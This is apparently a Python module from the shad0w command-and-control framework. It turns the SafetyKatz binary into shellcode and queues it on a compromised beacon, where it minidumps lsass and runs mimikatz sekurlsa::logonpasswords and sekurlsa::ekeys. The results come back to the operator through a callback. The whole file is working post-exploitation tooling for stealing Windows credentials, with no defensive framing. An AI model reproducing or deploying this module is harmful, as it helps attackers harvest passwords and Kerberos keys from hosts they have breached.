#
# Execute safetykatz on a session
#

import argparse

from lib import shellcode

__description__ = "A tool to minidump lsass then use mimikatz sekurlsa::logonpasswords & sekurlsa::ekeys on it"
__author__ = "@_batsec_, @harmj0y"

# identify the task as shellcode execute
USERCD_EXEC_ID = 0x3000

# location of safetykatz binary
SAFETYKATZ_BIN = "/root/shad0w/bin/SharpCollection/NetFramework_4.5_x86/SafetyKatz.exe"

# beacon to exec command on
current_beacon = None

# little hack but lets us pass the args to donut
class DummyClass(object):
    def __init__(self):
        pass

def safetykatz_callback(shad0w, data):
    shad0w.event.beacon_info(current_beacon, data)

    return ""

def main(shad0w, args, beacon):
    global current_beacon

    # make beacon global
    current_beacon = beacon

    safetykatz_args = ' '.join(args[1:])

    # kinda a hack to make sure we intergrate nice with the shellcode generator
    args = DummyClass()

    if len(safetykatz_args) != 0:
        args.param = safetykatz_args
    else:
        args.param = False
        safetykatz_args = False

    args.cls = False
    args.method = False
    args.runtime = False
    args.appdomain = False

    b64_comp_data = shellcode.generate(SAFETYKATZ_BIN, args, safetykatz_args)

    # dont clear the callbacks, cause the responses are chunked
    shad0w.clear_callbacks = False

    shad0w.beacons[current_beacon]["task"] = (USERCD_EXEC_ID, b64_comp_data)
    shad0w.beacons[current_beacon]["callback"] = safetykatz_callback
